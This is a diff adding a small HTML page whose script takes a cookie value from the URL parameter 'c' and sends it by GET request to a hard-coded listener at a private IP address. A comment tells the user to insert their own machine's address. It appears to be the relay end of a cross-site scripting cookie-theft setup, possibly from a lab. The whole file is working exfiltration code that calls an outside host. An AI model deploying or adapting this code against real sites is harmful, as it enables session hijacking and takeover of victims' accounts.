@@ -1,0 +1,19 @@
+<html>
+
+<body>
+    <script>
+        const queryString = window.location.search;
+        console.log(queryString);
+        const urlParams = new URLSearchParams(queryString);
+        const cookie = urlParams.get('c');
+        const Http = new XMLHttpRequest();
+        // Give your Ip machine Ip address where the server is running
+        var sendCookie = 'http://192.168.59.139:82/' + cookie;
+        Http.open("GET", sendCookie);
+        Http.send();
+
+    </script>
+
+</body>
+
+</html>
